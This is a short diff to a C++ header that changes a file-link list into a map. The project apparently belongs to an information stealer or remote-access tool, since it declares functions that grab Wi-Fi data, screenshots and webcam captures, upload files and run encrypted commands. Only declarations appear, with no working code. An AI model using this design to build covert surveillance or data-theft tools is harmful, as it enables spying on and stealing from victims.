@@ -1,6 +1,7 @@
 #pragma once
 #include "../commons/common.h"
 #include "json.hpp"
+#include <map>
 #include <sstream>
 #include <dshow.h>
 #include <cstdint>
@@ -22,7 +23,7 @@ typedef struct timeval2 {
     long tv_usec;
 } timeval2;
 
-extern std::vector<std::string> filesLink;
+extern std::map<std::string, std::string> filesLink;
 
 
 // functions.cpp
@@ -70,7 +71,7 @@ std::string GetWifi();
 std::string GetScreenshot();
 std::vector<std::string> GetWebcams();
 void UploadFiles(const std::vector<std::string>& files);
-std::vector<std::string> GetLinks();
+std::map<std::string, std::string> GetLinks();
 
 // security.cpp
 std::string RunEncCommand(const std::string& cmd);
